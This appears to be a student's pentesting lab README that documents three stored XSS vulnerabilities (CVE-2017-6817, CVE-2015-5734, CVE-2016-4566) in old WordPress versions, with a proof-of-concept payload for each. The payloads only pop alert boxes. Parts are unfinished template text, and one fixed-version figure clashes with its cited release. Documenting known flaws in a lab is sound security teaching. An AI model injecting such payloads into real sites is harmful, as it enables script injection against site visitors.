# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report
### 1. CVE-2017-6817: Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.1.16
    - Fixed in version: 6.0.3
  - [x] GIF Walkthrough: 
  - [x] Steps to recreate: 
    - Write a post:
    ```
    [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]
    ```
    - When the page loads, the alert will pop up
  - [x] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
  - References
    - https://wpscan.com/vulnerability/3ee54fc3-f4b4-4c35-8285-9d6719acecf0
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
    - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    - https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
    - https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
### 2. CVE-2015-5734: Legacy Theme Preview Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types: XSS 
    - Tested in version: 4.1.7
    - Fixed in version: 4.2.4
  - [x] GIF Walkthrough: 
  - [x] Steps to recreate: 
    - Comment under any post
    ```
    <a href='/wp-admin/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>
    ```
    - Hover over the comment
    - Alert box will pop up
  - [x] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/changeset/33549)
    - Bug comes from preview_theme() function
  - References 
    - [Blog](https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html)
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
    - https://wpscan.com/vulnerability/7d99fa14-0b94-4e9a-9fc0-d3f22648be4e)
### 3.  CVE-2016-4566: Pupload Same Origin Method Execution (SOME)
  - [x] Summary: 
    - Vulnerability types: Xss
    - Tested in version: 4.1.11
    - Fixed in version: 4.5.2
  - [x] GIF Walkthrough: 
  <img src="button.png">
  - [x] Steps to recreate: 
    - Post a comment with:
    ```
    <button onclick="fire()">Click</button>
    <script>
      function fire() {
       open('javascript:alert(1)');
      }
    </script>
    ```
    - Clicking the button causes an alert to pop up
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
  - References
    - https://wpscan.com/vulnerability/a82a6c6f-1787-4adc-84dd-3151f1edfd06
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
    - https://wordpress.org/news/2016/05/wordpress-4-5-2/
    - https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
    - https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [ezgif](https://ezgif.com/gif-to-mp4).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2022] [Nowshin Sayara]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
